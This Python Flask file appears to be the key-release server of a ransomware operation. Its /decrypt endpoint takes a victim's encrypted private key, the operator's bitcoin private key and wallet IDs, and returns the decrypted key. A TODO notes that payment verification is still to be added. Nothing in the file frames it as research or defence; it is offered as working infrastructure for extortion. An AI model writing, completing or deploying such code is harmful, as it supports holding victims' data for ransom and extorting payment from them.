from flask import Flask, request
from base64 import b64decode, b64encode
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asymmetric_padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend
from asymmetric_encryption import RSA
import logging

logging.basicConfig(
    format="%(asctime)s %(module)s %(levelname)s: %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# TODO: Check match between bitcoin private key and wallet_address


def decrypt_rsa_key(encrypted_key):
    logger.info("Decrypting RSA key")
    cipher = RSA()
    unencrypted_local_private_key = b"".join(
        [cipher.decrypt_data(key_part) for key_part in encrypted_key]
    )
    payload = {"key": b64encode(unencrypted_local_private_key).decode("ascii")}
    logger.info(f"Returning Payload: {payload}")
    return payload

def check_parameters(request_parameters):
    all_request_parameters = [
        "victim_private_key",
        "my_bitcoin_private_key",
        "my_wallet_id",
        "victim_wallet_id",
    ]

    if list(request_parameters.keys()) == all_request_parameters:
        return True
    return False

def unpack_request(request_parameters):
    victim_private_key = [b64decode(part) for part in request_parameters.get("victim_private_key")]
    my_bitcoin_private_key = [b64decode(part) for part in request_parameters.get("my_bitcoin_private_key")]
    my_wallet_id = b64decode(request_parameters.get("my_wallet_id")).decode()
    victim_wallet_id = b64decode(request_parameters.get("victim_wallet_id")).decode()
    return victim_private_key, my_bitcoin_private_key, my_wallet_id, victim_wallet_id


@app.route("/decrypt", methods=["POST"])
def process():
    request_parameters = request.get_json()
    logger.info(request_parameters)
    if check_parameters(request_parameters):
        victim_private_key, my_bitcoin_private_key, my_wallet_id, victim_wallet_id = unpack_request(request_parameters)
        return decrypt_rsa_key(victim_private_key)
    else:
        return {"message": "He killed three men in a bar with a pencil, WITH A F'KIN PENCIL"}


if __name__ == "__main__":
    app.run()

